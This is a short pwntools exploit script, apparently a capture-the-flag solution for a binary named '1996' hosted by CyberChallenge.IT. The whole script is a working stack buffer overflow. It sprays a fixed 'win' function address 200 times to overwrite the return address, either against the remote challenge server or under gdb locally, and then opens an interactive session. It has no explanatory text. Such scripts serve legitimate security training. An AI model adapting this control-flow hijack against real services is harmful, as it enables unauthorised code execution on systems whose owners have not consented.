from pwn import *

context.binary = elf = ELF('./1996')
context.terminal = ('gnome-terminal', '-e')

if args.REMOTE:
    r = remote('1996.challs.cyberchallenge.it', 9121)
else:
    r = gdb.debug(elf.path, '''
        b main
        continue
    ''')

win = 0x400897
r.recvuntil(b'?')
expl = p64(win)* 200
r.sendline(expl)
r.interactive()